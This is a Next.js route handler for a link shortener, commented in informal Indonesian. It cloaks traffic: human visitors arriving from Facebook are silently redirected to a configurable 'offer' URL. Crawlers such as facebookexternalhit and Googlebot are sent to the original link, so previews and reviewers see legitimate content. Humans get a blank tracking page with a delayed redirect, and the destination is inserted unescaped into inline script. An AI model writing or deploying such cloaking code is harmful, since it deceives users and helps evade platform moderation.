import { NextResponse } from 'next/server';
import { supabase } from '@/data/supabase';

export async function GET(
  request: Request,
  { params }: { params: Promise<{ slug: string }> }
) {
  // 1. Ambil Slug (ID Link)
  const { slug } = await params;

  // 2. Ambil URL Asli (entry) dan Settingan (settings) dari Database
  const [linkResult, settingsResult] = await Promise.all([
    supabase.from('links').select('url, clicks').eq('id', slug).single(),
    supabase.from('settings').select('*').eq('id', 1).single()
  ]);

  const entry = linkResult.data;
  const settings = settingsResult.data;

  // 3. Jika link tidak ada, lempar ke 404
  if (linkResult.error || !entry) {
    const url = new URL(request.url);
    return NextResponse.redirect(new URL('/404', url.origin), { status: 302 });
  }

  // --- LOGIKA HITUNG PENGUNJUNG ---
  const newCount = (entry.clicks || 0) + 1;
  supabase.from('links').update({ clicks: newCount }).eq('id', slug).then();

  // --- CONFIG DARI DATABASE (Pengganti JSON lu) ---
  const OFFER_URL = settings?.offer_url || "";
  const IS_OFFER_ACTIVE = settings?.offer_active || false; // Ambil status ON/OFF dari DB
  const HISTATS_ID = settings?.histats_id || "0";
  const DELAY_MS = settings?.delay_ms || 2000;
  const SITE_NAME = settings?.site_name || "Loading...";

  // --- LOGIKA DETEKSI (PERSIS KODE LU) ---
  const urlObj = new URL(request.url);
  const searchParams = urlObj.searchParams;
  const referer = request.headers.get('referer') || "";
  const userAgent = request.headers.get('user-agent') || "";

  const hasFbclid = searchParams.has('fbclid');
  const isFromFbReferer = referer.includes('facebook.com') || referer.includes('fb.com');
  const isBot = /facebookexternalhit|Facebot|Twitterbot|WhatsApp|TelegramBot|Discordbot|Googlebot|bingbot|baiduspider/i.test(userAgent);

  // Default Tujuan = Link Asli
  let finalDestination = entry.url;

  // Logika Belok ke Offer (PERSIS KODE LU)
  if (IS_OFFER_ACTIVE && (hasFbclid || isFromFbReferer) && !isBot) {
    finalDestination = OFFER_URL;
  }

  // KASUS A: Jika BOT -> Redirect Langsung ke TUJUAN AKHIR (Biar preview bener)
  if (isBot) {
    // Di kode lu: return NextResponse.redirect(finalDestination, { status: 307 });
    // Kalau bot, biasanya kita mau kasih konten asli (entry.url) biar gambarnya muncul di FB.
    // Tapi gua ikutin kode lu: redirect ke finalDestination.
    return NextResponse.redirect(finalDestination, { status: 307 });
  }

  // KASUS B: Jika MANUSIA -> Tampilan Putih Polos + Histats (HTML PERSIS KODE LU)
  const htmlContent = `
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>${SITE_NAME}</title>
      <style>
        body {
          background-color: #ffffff; /* Latar Putih Polos */
          margin: 0;
          height: 100vh;
          overflow: hidden;
        }
      </style>
    </head>
    <body>
      <script type="text/javascript">
        var _Hasync= _Hasync|| [];
        _Hasync.push(['Histats.start', '1,${HISTATS_ID},4,0,0,0,00010000']);
        _Hasync.push(['Histats.fasi', '1']);
        _Hasync.push(['Histats.track_hits', '']);
        (function() {
          var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
          hs.src = ('//s10.histats.com/js15_as.js');
          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
        })();
      </script>
      <noscript>
        <a href="/" target="_blank">
          <img src="//sstatic1.histats.com/0.gif?${HISTATS_ID}&101" alt="" border="0">
        </a>
      </noscript>

      <script>
        setTimeout(function() {
          window.location.href = "${finalDestination}";
        }, ${DELAY_MS});
      </script>
    </body>
    </html>
  `;

  return new NextResponse(htmlContent, {
    headers: { 'Content-Type': 'text/html' },
  });
}
